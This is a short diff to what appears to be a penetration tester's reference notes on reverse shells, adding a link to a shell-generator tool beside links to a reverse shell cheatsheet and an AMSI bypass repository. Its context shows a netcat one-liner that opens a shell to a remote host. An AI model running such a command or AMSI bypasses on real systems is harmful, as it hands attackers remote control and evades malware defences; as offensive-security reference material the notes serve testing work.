@@ -13,6 +13,7 @@
 - PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md
 - Amsi-Bypass-Powershell: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
 - https://github.com/m0rph-1/revshellgen (tool for generating rev shells)
+- Shellerator: https://github.com/ShutdownRepo/shellerator
 
 ## Most commonly used:
 - Netcat: `nc -e /bin/sh 10.0.0.1 1234`
